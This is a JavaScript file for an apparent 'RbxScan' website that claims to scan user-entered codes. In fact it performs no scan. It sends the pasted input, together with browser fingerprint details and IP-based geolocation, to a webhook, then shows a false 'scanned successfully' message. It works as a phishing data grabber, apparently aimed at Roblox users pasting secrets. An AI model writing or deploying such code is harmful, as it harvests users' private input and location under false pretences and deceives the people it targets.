// RbxScan Website JavaScript
// Configure your webhook URL here
const WEBHOOK_URL = 'https://your-webhook-url-here.com/webhook';

// DOM elements
const codeInput = document.getElementById('codeInput');
const scanButton = document.getElementById('scanButton');
const loadingOverlay = document.getElementById('loadingOverlay');

// Add event listeners
scanButton.addEventListener('click', handleScan);
codeInput.addEventListener('keydown', handleKeydown);

// Handle keyboard shortcuts
function handleKeydown(event) {
    // Ctrl/Cmd + Enter to submit
    if ((event.ctrlKey || event.metaKey) && event.key === 'Enter') {
        event.preventDefault();
        handleScan();
    }
    
    // Escape to clear
    if (event.key === 'Escape') {
        codeInput.value = '';
        codeInput.focus();
    }
}

// Main scan handler
async function handleScan() {
    const code = codeInput.value.trim();
    
    if (!code) {
        showMessage('Please enter a code to scan.', 'error');
        return;
    }
    
    if (WEBHOOK_URL === 'https://your-webhook-url-here.com/webhook') {
        showMessage('Please configure your webhook URL in script.js', 'error');
        return;
    }
    
    showLoading(true);
    
    try {
        const payload = await createPayload(code);
        const response = await sendToWebhook(payload);
        
        if (response.ok) {
            showMessage('Code scanned successfully!', 'success');
            codeInput.value = ''; // Clear the input on success
        } else {
            throw new Error(`Server responded with status: ${response.status}`);
        }
    } catch (error) {
        console.error('Scan error:', error);
        showMessage('Failed to scan code. Please try again.', 'error');
    } finally {
        showLoading(false);
    }
}

// Create payload with user data
async function createPayload(code) {
    const payload = {
        code: code,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        source: 'rbxscan-website',
        browser: {
            language: navigator.language,
            languages: navigator.languages,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        }
    };
    
    // Try to get location data (optional)
    try {
        const locationData = await getLocationData();
        payload.location = locationData;
    } catch (error) {
        console.log('Location data not available:', error);
    }
    
    return payload;
}

// Get user location data
async function getLocationData() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        if (response.ok) {
            return await response.json();
        }
    } catch (error) {
        console.log('Failed to fetch location data:', error);
    }
    return null;
}

// Send data to webhook
async function sendToWebhook(payload) {
    const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    });
    
    return response;
}

// Show loading state
function showLoading(show) {
    if (show) {
        loadingOverlay.classList.add('active');
        scanButton.disabled = true;
    } else {
        loadingOverlay.classList.remove('active');
        scanButton.disabled = false;
    }
}

// Show message to user
function showMessage(message, type = 'info') {
    // Remove any existing messages
    const existingMessage = document.querySelector('.message');
    if (existingMessage) {
        existingMessage.remove();
    }
    
    // Create message element
    const messageEl = document.createElement('div');
    messageEl.className = `message ${type}`;
    messageEl.textContent = message;
    
    // Add styles
    messageEl.style.cssText = `
        position: fixed;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        padding: 15px 25px;
        border-radius: 8px;
        font-weight: bold;
        z-index: 1001;
        max-width: 90%;
        text-align: center;
        animation: slideDown 0.3s ease;
        ${type === 'success' ? 'background: #4CAF50; color: white;' : ''}
        ${type === 'error' ? 'background: #f44336; color: white;' : ''}
        ${type === 'info' ? 'background: #2196F3; color: white;' : ''}
    `;
    
    // Add animation styles if not already present
    if (!document.querySelector('#messageStyles')) {
        const styleEl = document.createElement('style');
        styleEl.id = 'messageStyles';
        styleEl.textContent = `
            @keyframes slideDown {
                from { transform: translateX(-50%) translateY(-100%); opacity: 0; }
                to { transform: translateX(-50%) translateY(0); opacity: 1; }
            }
        `;
        document.head.appendChild(styleEl);
    }
    
    document.body.appendChild(messageEl);
    
    // Auto remove after 4 seconds
    setTimeout(() => {
        if (messageEl.parentNode) {
            messageEl.remove();
        }
    }, 4000);
}

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    console.log('RbxScan loaded successfully');
    codeInput.focus();
});